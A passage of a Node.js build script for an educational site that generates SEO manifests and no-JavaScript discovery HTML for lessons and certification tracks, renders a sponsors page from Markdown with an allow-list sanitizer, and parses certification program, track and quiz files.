  const excerptSource = proseParts.join(' ') || title;
  const excerpt = truncateWords(excerptSource, 220);
  const { description, descriptionSourceLength } = descriptionFromParts(title, proseParts);
  return {
    title,
    seoTitle: seoTitleFor(title),
    description,
    excerpt,
    sourceWordCount: wordCount(excerptSource),
    descriptionSourceLength,
  };
}

function canonicalLessonUrl(lessonPathValue) {
  return `${SITE_ORIGIN}/lesson?path=${encodeURIComponent(lessonPathValue)}`;
}

function lessonHref(lessonPathValue) {
  return `lesson?path=${encodeURIComponent(lessonPathValue)}`;
}

function canonicalCertificationUrl(trackId) {
  return `${SITE_ORIGIN}/certification?id=${encodeURIComponent(trackId)}`;
}

function certificationHref(trackId) {
  return `certification?id=${encodeURIComponent(trackId)}`;
}

function lessonLink(entry) {
  return entry ? {
    path: entry.path,
    title: entry.title,
    canonicalUrl: entry.canonicalUrl,
  } : null;
}

function disambiguateDuplicateSeoTitles(entries) {
  const entriesByTitle = new Map();
  for (const entry of entries) {
    const matches = entriesByTitle.get(entry.seoTitle) || [];
    matches.push(entry);
    entriesByTitle.set(entry.seoTitle, matches);
  }
  for (const matches of entriesByTitle.values()) {
    if (matches.length < 2) continue;
    for (const entry of matches) {
      const qualifier = entry.context.kind === 'course'
        ? entry.context.phaseName
        : entry.context.programName;
      entry.seoTitle = seoTitleFor(`${entry.title} - ${qualifier}`);
    }
    if (new Set(matches.map(entry => entry.seoTitle)).size !== matches.length) {
      throw new Error(`Could not disambiguate duplicate SEO title: ${matches[0].title}`);
    }
  }
}

function buildSeoManifests(phases, certifications, learningPaths = []) {
  const learningPathIdsByLesson = new Map();
  for (const learningPath of learningPaths) {
    for (const lesson of (learningPath.lessons || []).concat(learningPath.optionalLessons || [])) {
      if (!lesson || !lesson.path) continue;
      const ids = learningPathIdsByLesson.get(lesson.path) || [];
      if (!ids.includes(learningPath.id)) ids.push(learningPath.id);
      learningPathIdsByLesson.set(lesson.path, ids);
    }
  }
  const fromTrackIdsByLesson = new Map();
  for (const track of certifications.tracks || []) {
    for (const lesson of track.lessons || []) {
      if (!lesson || !lesson.path || lesson.path.startsWith('certifications/')) continue;
      const ids = fromTrackIdsByLesson.get(lesson.path) || [];
      if (!ids.includes(track.id)) ids.push(track.id);
      fromTrackIdsByLesson.set(lesson.path, ids);
    }
  }

  const courseEntries = [];
  for (const phase of phases) {
    for (const lesson of phase.lessons) {
      const relPath = lessonPath(lesson.url);
      if (!relPath) continue;
      const docPath = path.join(REPO_ROOT, relPath, 'docs', 'en.md');
      if (!fs.existsSync(docPath)) continue;
      const docSeoResult = lessonDocumentSeo(fs.readFileSync(docPath, 'utf8'), lesson.name);
      const { sourceWordCount, descriptionSourceLength, ...docSeo } = docSeoResult;
      if (sourceWordCount >= 180 && wordCount(docSeo.excerpt) < 180) {
        throw new Error(`SEO lesson ${relPath} has enough prose but an excerpt shorter than 180 words`);
      }
      if (descriptionSourceLength >= 120 && docSeo.description.length < 120) {
        throw new Error(`SEO lesson ${relPath} has enough prose but a description shorter than 120 characters`);
      }
      courseEntries.push({
        path: relPath,
        ...docSeo,
        context: {
          kind: 'course',
          phaseId: phase.id,
          phaseName: phase.name,
          type: lesson.type || '',
          languages: lesson.lang || '',
        },
        previous: null,
        next: null,
        learningPathIds: (learningPathIdsByLesson.get(relPath) || []).slice().sort(),
        fromTrackIds: (fromTrackIdsByLesson.get(relPath) || []).slice().sort(),
        sourceUrl: githubSourceUrl(relPath),
        canonicalUrl: canonicalLessonUrl(relPath),
      });
    }
  }
  for (let index = 0; index < courseEntries.length; index++) {
    courseEntries[index].previous = lessonLink(courseEntries[index - 1]);
    courseEntries[index].next = lessonLink(courseEntries[index + 1]);
  }

  const programsById = new Map((certifications.programs || []).map(program => [program.id, program]));
  const certificationEntries = [];
  const certificationEntryByPath = new Map();
  for (const lesson of Object.values(certifications.lessonsByPath || {}).sort((a, b) => a.path.localeCompare(b.path))) {
    const program = programsById.get(lesson.programId) || {};
    const docSeoResult = lessonDocumentSeo(lesson.markdown, lesson.name);
    const { sourceWordCount, descriptionSourceLength, ...docSeo } = docSeoResult;
    if (sourceWordCount >= 180 && wordCount(docSeo.excerpt) < 180) {
      throw new Error(`SEO lesson ${lesson.path} has enough prose but an excerpt shorter than 180 words`);
    }
    if (descriptionSourceLength >= 120 && docSeo.description.length < 120) {
      throw new Error(`SEO lesson ${lesson.path} has enough prose but a description shorter than 120 characters`);
    }
    const entry = {
      path: lesson.path,
      ...docSeo,
      context: {
        kind: 'certification',
        programId: program.id || '',
        programName: program.name || '',
        trackIds: Array.isArray(lesson.trackIds) ? lesson.trackIds.slice() : [],
        type: lesson.type || '',
        languages: lesson.languages || '',
      },
      previous: null,
      next: null,
      navigationByTrack: {},
      learningPathIds: [],
      fromTrackIds: [],
      sourceUrl: githubSourceUrl(lesson.path),
      canonicalUrl: canonicalLessonUrl(lesson.path),
    };
    certificationEntries.push(entry);
    certificationEntryByPath.set(entry.path, entry);
  }
  const certificationRouteAssigned = new Set();
  for (const track of certifications.tracks || []) {
    const route = (track.lessons || [])
      .map(ref => certificationEntryByPath.get(ref && ref.path))
      .filter(Boolean);
    for (let index = 0; index < route.length; index++) {
      const entry = route[index];
      const navigation = {
        previous: lessonLink(route[index - 1]),
        next: lessonLink(route[index + 1]),
      };
      entry.navigationByTrack[track.id] = navigation;
      if (!certificationRouteAssigned.has(entry.path)) {
        entry.previous = navigation.previous;
        entry.next = navigation.next;
        certificationRouteAssigned.add(entry.path);
      }
    }
  }

  for (const entry of certificationEntries) {
    const expectedTrackIds = [...new Set(entry.context.trackIds)].sort();
    const emittedTrackIds = Object.keys(entry.navigationByTrack).sort();
    if (JSON.stringify(expectedTrackIds) !== JSON.stringify(emittedTrackIds)) {
      throw new Error(`Certification navigation coverage mismatch for ${entry.path}`);
    }
  }

  const allEntries = courseEntries.concat(certificationEntries)
    .sort((a, b) => a.path.localeCompare(b.path));
  disambiguateDuplicateSeoTitles(allEntries);
  const lessons = Object.fromEntries(allEntries.map(entry => [entry.path, entry]));
  const certificationTrackIds = (certifications.tracks || [])
    .map(track => track && track.id)
    .filter(Boolean)
    .sort();
  const lessonManifest = { version: SEO_MANIFEST_VERSION, certificationTrackIds, lessons };

  const lessonByPath = new Map(allEntries.map(entry => [entry.path, entry]));
  const tracks = {};
  for (const track of certifications.tracks || []) {
    const title = normalizeWhitespace(track.credential || track.title || track.shortName || track.id);
    const audience = normalizeWhitespace(track.audience || '');
    const trackProse = [
      track.summary,
      audience,
      ...(track.recommendedExperience || []),
      ...(track.domains || []).flatMap(domain => [domain.name, ...(domain.objectives || [])]),
    ].filter(Boolean);
    const { description } = descriptionFromParts(title, [track.summary, audience]);
    const excerpt = truncateWords(trackProse.join(' '), 220);
    const trackLessons = (track.lessons || []).map(ref => {
      const lesson = lessonByPath.get(ref && ref.path);
      return lesson ? lessonLink(lesson) : null;
    }).filter(Boolean);
    tracks[track.id] = {
      id: track.id,
      title,
      seoTitle: seoTitleFor(title),
      description,
      excerpt,
      canonicalUrl: canonicalCertificationUrl(track.id),
      sourceUrl: githubSourceUrl(track.sourcePath, 'blob'),
      lessons: trackLessons,
    };
  }
  const certificationManifest = { version: SEO_MANIFEST_VERSION, tracks };

  const readableDocs = collectMarkdownFiles(path.join(REPO_ROOT, 'phases'), [])
    .concat(certificationProgramDirs().flatMap(dir => collectMarkdownFiles(path.join(dir, 'lessons'), [])))
    .filter(file => file.endsWith(`${path.sep}docs${path.sep}en.md`))
    .map(file => path.relative(REPO_ROOT, path.dirname(path.dirname(file))).split(path.sep).join('/'))
    .sort();
  const emittedPaths = Object.keys(lessons).sort();
  if (JSON.stringify(readableDocs) !== JSON.stringify(emittedPaths)) {
    const emitted = new Set(emittedPaths);
    const readable = new Set(readableDocs);
    const missing = readableDocs.filter(value => !emitted.has(value));
    const extra = emittedPaths.filter(value => !readable.has(value));
    throw new Error(`SEO lesson coverage mismatch. Missing: ${missing.join(', ') || 'none'}. Extra: ${extra.join(', ') || 'none'}.`);
  }
  const canonicals = new Set();
  const seoTitles = new Set();
  for (const entry of Object.values(lessons)) {
    for (const field of ['path', 'title', 'seoTitle', 'description', 'excerpt', 'sourceUrl', 'canonicalUrl']) {
    if (!entry[field]) throw new Error(`SEO lesson ${entry.path || '(unknown)'} is missing ${field}`);
    }
    if (entry.seoTitle.length > 60) throw new Error(`SEO lesson ${entry.path} title exceeds 60 characters`);
    if (seoTitles.has(entry.seoTitle)) throw new Error(`Duplicate SEO lesson title: ${entry.seoTitle}`);
    seoTitles.add(entry.seoTitle);
    if (entry.description.length > 160) throw new Error(`SEO lesson ${entry.path} description exceeds 160 characters`);
    if (wordCount(entry.excerpt) > 220) throw new Error(`SEO lesson ${entry.path} excerpt exceeds 220 words`);
    if (canonicals.has(entry.canonicalUrl)) throw new Error(`Duplicate lesson canonical URL: ${entry.canonicalUrl}`);
    canonicals.add(entry.canonicalUrl);
  }
  const trackEntries = Object.values(tracks);
  const configuredTrackIds = (certifications.tracks || []).map(track => track.id);
  if (configuredTrackIds.length === 0) throw new Error('Expected at least one certification SEO track');
  if (new Set(configuredTrackIds).size !== configuredTrackIds.length) {
    throw new Error('Certification SEO track ids must be unique');
  }
  if (trackEntries.length !== configuredTrackIds.length) {
    throw new Error(`Expected ${configuredTrackIds.length} certification SEO tracks, found ${trackEntries.length}`);
  }
  for (const field of ['title', 'description', 'excerpt', 'canonicalUrl']) {
    if (new Set(trackEntries.map(entry => entry[field])).size !== trackEntries.length) {
      throw new Error(`Certification SEO tracks need unique ${field} values`);
    }
  }
  for (const entry of trackEntries) {
    if (entry.seoTitle.length > 60) throw new Error(`Certification SEO track ${entry.id} title exceeds 60 characters`);
    if (entry.description.length > 160) throw new Error(`Certification SEO track ${entry.id} description exceeds 160 characters`);
    if (wordCount(entry.excerpt) > 220) throw new Error(`Certification SEO track ${entry.id} excerpt exceeds 220 words`);
  }

  return { lessonManifest, certificationManifest };
}

function htmlEscape(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function renderCatalogDiscovery(phases, lessonManifest) {
  const rows = [];
  for (const phase of phases) {
    for (const lesson of phase.lessons) {
      const relPath = lessonPath(lesson.url);
      const seo = relPath && lessonManifest.lessons[relPath];
      if (!seo) continue;
      rows.push(
        `            <tr data-generated-discovery="lesson">` +
        `<td>${htmlEscape(String(phase.id).padStart(2, '0'))}</td>` +
        `<td><a href="${htmlEscape(lessonHref(relPath))}">${htmlEscape(seo.title)}</a></td>` +
        `<td>${htmlEscape(lesson.type || '')}</td>` +
        `<td>${htmlEscape(lesson.lang || '')}</td>` +
        `<td>${htmlEscape(lesson.status || '')}</td></tr>`
      );
    }
  }
  return rows.join('\n');
}

function renderCertificationTrackDiscovery(track, certificationManifest) {
  const seo = certificationManifest.tracks[track.id];
  if (!seo) return '';
  const links = seo.lessons.map(lesson =>
    `                <li><a href="${htmlEscape(lessonHref(lesson.path))}">${htmlEscape(lesson.title)}</a></li>`
  ).join('\n');
  return `            <article class="cert-track-card" data-generated-discovery="certification">\n` +
    `              <h3><a href="${htmlEscape(certificationHref(track.id))}">${htmlEscape(seo.title)}</a></h3>\n` +
    `              <p>${htmlEscape(seo.description)}</p>\n` +
    `              <ul aria-label="${htmlEscape(seo.title)} lessons">\n${links}\n              </ul>\n` +
    `            </article>`;
}

function renderCertificationProgramLinks(program) {
  const label = program.shortName || program.name;
  const links = [];
  if (program.learnerGuidePath) {
    links.push(`<a class="cert-action secondary" href="${htmlEscape(GITHUB_BLOB_BASE + program.learnerGuidePath)}" target="_blank" rel="noopener" aria-label="${htmlEscape(`Learn ${label} with an AI tutor on GitHub, opens in a new tab`)}">Learn with an AI tutor on GitHub</a>`);
  }
  if (program.tutorSkillPath) {
    links.push(`<a class="cert-action secondary" href="${htmlEscape(GITHUB_BLOB_BASE + program.tutorSkillPath)}" target="_blank" rel="noopener" aria-label="${htmlEscape(`Read the ${label} tutor skill on GitHub, opens in a new tab`)}">Read the tutor skill</a>`);
  }
  return links.length ? `          <div class="cert-track-hero-actions cert-program-actions">${links.join('')}</div>\n` : '';
}

function renderCertificationDiscovery(certifications, certificationManifest) {
  return (certifications.programs || []).map(program => {
    const cards = (certifications.tracks || [])
      .filter(track => track.programId === program.id)
      .map(track => renderCertificationTrackDiscovery(track, certificationManifest))
      .filter(Boolean)
      .join('\n');
    if (!cards) return '';
    const headingId = `certProgram-${program.id}`;
    return `        <section class="cert-container cert-section cert-program-section" data-generated-discovery="certification-program" aria-labelledby="${htmlEscape(headingId)}">\n` +
      `          <div class="cert-section-heading"><div><div class="cert-eyebrow">${htmlEscape(program.provider || 'Certification program')}</div><h2 id="${htmlEscape(headingId)}">${htmlEscape(program.name || program.id)}</h2></div><p>${htmlEscape(program.summary || '')}</p></div>\n` +
      renderCertificationProgramLinks(program) +
      `          <div class="cert-track-grid">\n${cards}\n          </div>\n` +
      `        </section>`;
  }).filter(Boolean).join('\n');
}

function certificationStats(certifications) {
  const assessments = Object.values(certifications.assessmentsById || {});
  return {
    programs: (certifications.programs || []).length,
    tracks: (certifications.tracks || []).length,
    lessons: Object.keys(certifications.lessonsByPath || {}).length,
    questions: assessments.reduce((sum, assessment) => sum + (Array.isArray(assessment.questions) ? assessment.questions.length : 0), 0),
  };
}

function syncCertificationStats(certifications) {
  const stats = certificationStats(certifications);
  const indexPath = path.join(__dirname, 'index.html');
  const before = fs.readFileSync(indexPath, 'utf8');
  const after = before.replace(
    /(<strong data-cert-stat="(programs|tracks|lessons|questions)">)\d+(<\/strong>)/g,
    (match, open, name, close) => `${open}${stats[name]}${close}`
  );
  if (after !== before) {
    fs.writeFileSync(indexPath, after, 'utf8');
    console.log('   synced certification counts in index.html');
  }
  return stats;
}

function replaceGeneratedDiscovery(filePath, startMarker, endMarker, content) {
  const source = fs.readFileSync(filePath, 'utf8');
  const pattern = new RegExp(`${escapeRegExp(startMarker)}[\\s\\S]*?${escapeRegExp(endMarker)}`);
  if (!pattern.test(source)) throw new Error(`${path.basename(filePath)} is missing generated discovery markers`);
  const updated = source.replace(pattern, `${startMarker}\n${content}\n          ${endMarker}`);
  fs.writeFileSync(filePath, updated, 'utf8');
}

function markdownHeadingSlug(text) {
  return String(text).toLowerCase().replace(/[^a-z0-9 _-]/g, '').trim().replace(/ /g, '-');
}

function sanitizeSponsorTag(tag) {
  const match = tag.match(/^<(\/?)([a-z]+)\b([^>]*)>$/i);
  if (!match) return null;
  const name = match[2].toLowerCase();
  const allowed = SPONSOR_TAG_ATTRIBUTES[name];
  if (!allowed) return null;
  if (match[1]) return name === 'source' || name === 'img' ? '' : `</${name}>`;
  const attributes = [];
  for (const [, rawKey, value] of match[3].matchAll(/([a-z-]+)="([^"]*)"/gi)) {
    const key = rawKey.toLowerCase();
    if (!allowed.includes(key)) continue;
    if (['href', 'src', 'srcset'].includes(key) && !/^https:\/\/[^\s"'<>]+$/.test(value)) return null;
    if (key === 'media' && !/^\(prefers-color-scheme: (?:dark|light)\)$/.test(value)) return null;
    if ((key === 'width' || key === 'height') && !/^\d{1,4}$/.test(value)) return null;
    attributes.push(`${key}="${htmlEscape(value)}"`);
  }
  if (name === 'a') attributes.push('target="_blank"', 'rel="noopener"');
  return `<${name}${attributes.map(attribute => ` ${attribute}`).join('')}>`;
}

function sponsorLinkTarget(href) {
  if (/^#[\w-]+$/.test(href)) return { href, external: false };
  if (/^https:\/\/[^\s"'<>]+$/.test(href)) return { href, external: true };
  if (/^[\w.-]+(?:\/[\w.-]+)*(?:#[\w-]+)?$/.test(href) && !href.includes('..')) {
    return { href: GITHUB_BLOB_BASE + href, external: true };
  }
  return null;
}

function renderSponsorInline(text) {
  const kept = [];
  const keep = html => `\u0000${kept.push(html) - 1}\u0000`;
  const openTags = {};
  const staged = String(text)
    .replace(/`([^`]+)`/g, (match, code) => keep(`<code>${htmlEscape(code)}</code>`))
    .replace(/<\/?[a-z][^>]*>/gi, tag => {
      const safe = sanitizeSponsorTag(tag);
      if (safe === null) return tag;
      const closing = safe.match(/^<\/([a-z]+)>$/);
      const opening = safe.match(/^<(a|picture)\b/);
      if (closing) {
        if (!openTags[closing[1]]) return tag;
        openTags[closing[1]]--;
      } else if (opening) {
        openTags[opening[1]] = (openTags[opening[1]] || 0) + 1;
      }
      return keep(safe);
    });
  return htmlEscape(staged)
    .replace(/\[([^\]]+)\]\(([^)\s]+)\)/g, (match, label, href) => {
      const target = sponsorLinkTarget(href.replace(/&amp;/g, '&'));
      if (!target) return label;
      const opener = target.external ? ' target="_blank" rel="noopener"' : '';
      return `<a href="${htmlEscape(target.href)}"${opener}>${label}</a>`;
    })
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
    .replace(/\u0000(\d+)\u0000/g, (match, index) => kept[Number(index)]);
}

function splitMarkdownTableRow(row) {
  return row.replace(/^\||\|$/g, '').split('|').map(cell => cell.trim());
}

function renderSponsorTable(rows) {
  if (rows.length < 2 || !/^\|?\s*:?-{3,}/.test(rows[1])) {
    return rows.map(row => `<p>${renderSponsorInline(row)}</p>`).join('\n');
  }
  const alignment = splitMarkdownTableRow(rows[1]).map(cell => {
    if (!cell.endsWith(':')) return '';
    return cell.startsWith(':') ? 'center' : 'right';
  });
  const cell = (tag, value, index) => {
    const align = alignment[index] ? ` class="align-${alignment[index]}"` : '';
    return `<${tag}${align}>${renderSponsorInline(value)}</${tag}>`;
  };
  const head = splitMarkdownTableRow(rows[0]).map((value, index) => cell('th', value, index)).join('');
  const body = rows.slice(2).map(row =>
    `<tr>${splitMarkdownTableRow(row).map((value, index) => cell('td', value, index)).join('')}</tr>`
  ).join('');
  return `<div class="sponsor-table-wrap"><table><thead><tr>${head}</tr></thead><tbody>${body}</tbody></table></div>`;
}

function renderSponsorsMarkdown(markdown) {
  const html = [];
  let paragraph = [];
  let list = null;
  let table = [];
  const flushParagraph = () => {
    if (paragraph.length) html.push(`<p>${renderSponsorInline(paragraph.join(' '))}</p>`);
    paragraph = [];
  };
  const flushList = () => {
    if (list) html.push(`<${list.tag}>${list.items.map(item => `<li>${renderSponsorInline(item)}</li>`).join('')}</${list.tag}>`);
    list = null;
  };
  const flushTable = () => {
    if (table.length) html.push(renderSponsorTable(table));
    table = [];
  };
  for (const line of String(markdown).replace(/\r\n?/g, '\n').split('\n')) {
    const trimmed = line.trim();
    if (!trimmed) {
      flushParagraph();
      flushList();
      flushTable();
      continue;
    }
    if (/^\|.*\|$/.test(trimmed)) {
      flushParagraph();
      flushList();
      table.push(trimmed);
      continue;
    }
    flushTable();
    const heading = trimmed.match(/^(#{1,3})\s+(.+)$/);
    if (heading) {
      flushParagraph();
      flushList();
      const level = heading[1].length;
      html.push(`<h${level} id="${markdownHeadingSlug(heading[2])}">${renderSponsorInline(heading[2])}</h${level}>`);
      continue;
    }
    const item = line.match(/^(?:[-*]|(\d+)\.)\s+(.+)$/);
    if (item) {
      flushParagraph();
      const tag = item[1] ? 'ol' : 'ul';
      if (!list || list.tag !== tag) {
        flushList();
        list = { tag, items: [] };
      }
      list.items.push(item[2]);
      continue;
    }
    if (list && /^\s+\S/.test(line)) {
      list.items[list.items.length - 1] += ` ${trimmed}`;
      continue;
    }
    flushList();
    paragraph.push(trimmed);
  }
  flushParagraph();
  flushList();
  flushTable();
  return html.join('\n');
}

function writeSponsorsPage() {
  const html = renderSponsorsMarkdown(fs.readFileSync(SPONSORS_SOURCE_PATH, 'utf8'));
  replaceGeneratedDiscovery(path.join(__dirname, 'sponsors.html'), SPONSORS_PAGE_START, SPONSORS_PAGE_END, html);
  console.log('   rendered sponsors.html from SPONSORS.md');
}

function writeSeoArtifacts(phases, certifications, learningPaths) {
  const manifests = buildSeoManifests(phases, certifications, learningPaths);
  fs.writeFileSync(LESSON_SEO_OUTPUT_PATH, JSON.stringify(manifests.lessonManifest, null, 2) + '\n', 'utf8');
  fs.writeFileSync(CERTIFICATION_SEO_OUTPUT_PATH, JSON.stringify(manifests.certificationManifest, null, 2) + '\n', 'utf8');
  replaceGeneratedDiscovery(
    path.join(__dirname, 'catalog.html'),
    CATALOG_DISCOVERY_START,
    CATALOG_DISCOVERY_END,
    renderCatalogDiscovery(phases, manifests.lessonManifest)
  );
  replaceGeneratedDiscovery(
    path.join(__dirname, 'certifications.html'),
    CERTIFICATION_DISCOVERY_START,
    CERTIFICATION_DISCOVERY_END,
    renderCertificationDiscovery(certifications, manifests.certificationManifest)
  );
  console.log(`   wrote lesson-seo.json (${Object.keys(manifests.lessonManifest.lessons).length} lessons)`);
  console.log(`   wrote certification-seo.json (${Object.keys(manifests.certificationManifest.tracks).length} tracks)`);
  console.log('   refreshed no-JavaScript catalog discovery links');
  return manifests;
}

// ─── Certification programs, tracks, lessons, and assessments ─────────
// Certifications are a curated overlay, not another curriculum phase. They
// deliberately live in their own generated data file so PHASES, README counts,
// the core catalog, and roadmap behavior cannot change when a track is added.
function readJson(filePath, label) {
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch (err) {
    throw new Error(`Could not read ${label || path.relative(REPO_ROOT, filePath)}: ${err.message}`);
  }
}

function safeRepoPath(relPath, baseDir) {
  if (!relPath || typeof relPath !== 'string') return null;
  const candidate = path.resolve(baseDir || REPO_ROOT, relPath);
  const rootWithSep = REPO_ROOT.endsWith(path.sep) ? REPO_ROOT : REPO_ROOT + path.sep;
  if (candidate !== REPO_ROOT && !candidate.startsWith(rootWithSep)) return null;
  return candidate;
}

function certificationDocMeta(markdown, fallbackName) {
  const result = {
    name: fallbackName || '',
    summary: '',
    keywords: '',
    type: 'Learn',
    languages: '',
    prerequisites: '',
    time: '',
  };
  const headings = [];
  for (const raw of String(markdown || '').split(/\r?\n/)) {
    const line = raw.trim();
    if (line.startsWith('# ') && !result.name) result.name = line.slice(2).trim();
    if (line.startsWith('# ')) result.name = line.slice(2).trim();
    if (!result.summary && line.startsWith('> ')) result.summary = line.slice(2).trim();
    if (line.startsWith('### ')) headings.push(line.slice(4).trim());
    const field = line.match(/^\*\*(Type|Languages|Prerequisites|Time):\*\*\s*(.+)$/i);
    if (field) {
      const key = field[1].toLowerCase();
      if (key === 'type') result.type = field[2].trim();
      else result[key] = field[2].trim();
    }
  }
  result.keywords = headings.filter(Boolean).join(' · ');
  if (result.summary.length > 180) result.summary = result.summary.slice(0, 177) + '…';
  return result;
}

function normalizeLessonRef(ref) {
  if (typeof ref === 'string') return { path: ref };
  if (!ref || typeof ref !== 'object') return null;
  return { ...ref };
}

function quizContentVersion(quiz) {
  if (!quiz) return null;
  return crypto.createHash('sha256').update(JSON.stringify(quiz)).digest('hex');
}

function trackDeclarationValue(declaration) {
  if (typeof declaration === 'string') return declaration;
  if (!declaration || typeof declaration !== 'object') return '';
  return declaration.id || declaration.slug || declaration.path || declaration.file || '';
}

function trackDeclarationIndex(program, track, file) {
  if (!Array.isArray(program.tracks)) return -1;
  return program.tracks.findIndex(declaration => {
    const value = trackDeclarationValue(declaration);
    if (!value) return false;
    const declaredFile = path.basename(value);
    const declaredSlug = path.basename(value, path.extname(value));
    return value === track.id ||
      value === track.slug ||
      declaredFile === file ||
      declaredSlug === track.slug;
  });
}

function assertCertificationTrackOrder(program, tracks) {
  const declaredTrackIds = Array.isArray(program.tracks) ? program.tracks : [];
  const emittedTrackIds = tracks.map(track => track.id);
  const matches = declaredTrackIds.length === emittedTrackIds.length &&
    declaredTrackIds.every((id, index) => id === emittedTrackIds[index]);
  if (!matches) {
    throw new Error(
      'Certification track order mismatch: program.json declares ' +
      JSON.stringify(declaredTrackIds) + ' but track manifests emit ' +
      JSON.stringify(emittedTrackIds)
    );
  }
}

function resolveAssessmentFile(programDir, assessmentPath) {
  if (!assessmentPath) return null;
  const fromRoot = safeRepoPath(assessmentPath, REPO_ROOT);
  if (fromRoot && fs.existsSync(fromRoot)) return fromRoot;
  const fromProgram = safeRepoPath(assessmentPath, programDir);
  if (fromProgram && fs.existsSync(fromProgram)) return fromProgram;
  return fromRoot || fromProgram;
}

function certificationLessonFiles(lessonDir, lessonRelPath, folderName) {
  const folderPath = path.join(lessonDir, folderName);
  if (!fs.existsSync(folderPath)) return [];

  const files = [];
  function collectFiles(currentDir, relativeDir) {
    const entries = fs.readdirSync(currentDir, { withFileTypes: true })
      .sort((a, b) => a.name.localeCompare(b.name));
    for (const entry of entries) {
      const relativePath = relativeDir ? `${relativeDir}/${entry.name}` : entry.name;
      const fullPath = path.join(currentDir, entry.name);
      if (entry.isDirectory() && folderName === 'outputs') {
        collectFiles(fullPath, relativePath);
      } else if (entry.isFile()) {
        files.push({ fullPath, relativePath });
      }
    }
  }
  collectFiles(folderPath, '');

  return files.map(file => {
    const { fullPath, relativePath } = file;
    let description = '';
    if (folderName === 'outputs' && relativePath.endsWith('.md')) {
      try {
        const content = fs.readFileSync(fullPath, 'utf8');
        const meta = parseFrontmatter(content) || {};
        description = String(meta.description || '').trim();
        if (!description) {
          description = content.split(/\r?\n/)
            .map(line => line.trim())
            .find(line => line && !line.startsWith('#') && line !== '---') || '';
        }
      } catch (_) {}
    }
    return {
      name: relativePath,
      path: `${lessonRelPath}/${folderName}/${relativePath}`,
      size: fs.statSync(fullPath).size,
      description,
    };
  });
}

function certificationProgramDirs() {
  if (!fs.existsSync(CERTIFICATIONS_PATH)) return [];
  return fs.readdirSync(CERTIFICATIONS_PATH, { withFileTypes: true })
    .filter(entry => entry.isDirectory())
    .map(entry => path.join(CERTIFICATIONS_PATH, entry.name))
    .filter(dir => fs.existsSync(path.join(dir, 'program.json')))
    .sort();
}

function repoRelativePath(filePath) {
  return path.relative(REPO_ROOT, filePath).split(path.sep).join('/');
}

function existingRepoFile(relPath) {
  return fs.existsSync(path.join(REPO_ROOT, relPath)) ? relPath : '';
}

function parseCertifications() {
  const merged = { programs: [], tracks: [], lessonsByPath: {}, assessmentsById: {} };
  for (const programDir of certificationProgramDirs()) {
    const parsed = parseCertificationProgram(programDir);
    if (merged.programs.some(program => program.id === parsed.program.id)) {
      throw new Error(`Duplicate certification program id: ${parsed.program.id}`);
    }
    for (const track of parsed.tracks) {
      if (merged.tracks.some(existing => existing.id === track.id)) {
        throw new Error(`Duplicate certification track id across programs: ${track.id}`);
      }
    }
    for (const id of Object.keys(parsed.assessmentsById)) {
      if (merged.assessmentsById[id]) throw new Error(`Duplicate certification assessment id across programs: ${id}`);
    }
    merged.programs.push(parsed.program);
    merged.tracks.push(...parsed.tracks);
    Object.assign(merged.lessonsByPath, parsed.lessonsByPath);
    Object.assign(merged.assessmentsById, parsed.assessmentsById);
  }
  return merged;
}

function parseCertificationProgram(programDir) {
  const program = readJson(path.join(programDir, 'program.json'), 'certification program');
  const programSlug = program.slug || program.id || path.basename(programDir);
  const programKey = path.basename(programDir);
  program.directory = repoRelativePath(programDir);
  program.learnerGuidePath = existingRepoFile(`${program.directory}/GETTING_STARTED.md`);
  program.tutorSkillPath = existingRepoFile(`skills/${programKey}-certification/SKILL.md`);
  const tracksDir = path.join(programDir, 'tracks');
  const trackFiles = fs.existsSync(tracksDir)
    ? fs.readdirSync(tracksDir).filter(file => file.endsWith('.json')).sort()
    : [];
  const trackEntries = trackFiles.map(file => {
    const track = readJson(path.join(tracksDir, file), `certification track ${file}`);
    track.id = track.id || `${programSlug}-${track.slug || path.basename(file, '.json')}`;
    track.slug = track.slug || path.basename(file, '.json');
    track.programId = program.id;
    track.sourcePath = repoRelativePath(path.join(tracksDir, file));
    track.lessons = Array.isArray(track.lessons)
      ? track.lessons.map(normalizeLessonRef).filter(Boolean)
      : [];
    track.assessments = Array.isArray(track.assessments) ? track.assessments : [];
    return { file, track };
  });
  trackEntries.sort((a, b) => {
    const aIndex = trackDeclarationIndex(program, a.track, a.file);
    const bIndex = trackDeclarationIndex(program, b.track, b.file);
    if (aIndex !== -1 || bIndex !== -1) {
      if (aIndex === -1) return 1;
      if (bIndex === -1) return -1;
      if (aIndex !== bIndex) return aIndex - bIndex;
    }
    return a.file.localeCompare(b.file);
  });
  const tracks = trackEntries.map(entry => entry.track);
  assertCertificationTrackOrder(program, tracks);

  const lessonsByPath = {};
  const lessonsDir = path.join(programDir, 'lessons');
  if (fs.existsSync(lessonsDir)) {
    for (const entry of fs.readdirSync(lessonsDir, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
      if (!entry.isDirectory()) continue;
      const relPath = path.relative(REPO_ROOT, path.join(lessonsDir, entry.name)).split(path.sep).join('/');
      const docPath = path.join(lessonsDir, entry.name, 'docs', 'en.md');
      if (!fs.existsSync(docPath)) continue;
      const markdown = fs.readFileSync(docPath, 'utf8');
      const quizPath = path.join(lessonsDir, entry.name, 'quiz.json');
      const quiz = fs.existsSync(quizPath) ? readJson(quizPath, `${relPath}/quiz.json`) : null;
      const meta = certificationDocMeta(markdown, entry.name.replace(/^\d+-/, '').replace(/-/g, ' '));
      const lessonDir = path.join(lessonsDir, entry.name);
      lessonsByPath[relPath] = {
        path: relPath,
        slug: entry.name,
        programId: program.id,
        name: meta.name,
        summary: meta.summary,
        keywords: meta.keywords,
        type: meta.type,
        languages: meta.languages,
        prerequisites: meta.prerequisites,
        time: meta.time,
        markdown,
        quiz,
        quizVersion: quizContentVersion(quiz),
        files: {
          code: certificationLessonFiles(lessonDir, relPath, 'code'),
          outputs: certificationLessonFiles(lessonDir, relPath, 'outputs'),
        },
        trackIds: [],
        domainsByTrack: {},
        rolesByTrack: {},
      };
    }
  }

  for (const track of tracks) {
    for (const ref of track.lessons) {
      const lesson = lessonsByPath[ref.path];
      if (!lesson) continue;
      if (!lesson.trackIds.includes(track.id)) lesson.trackIds.push(track.id);
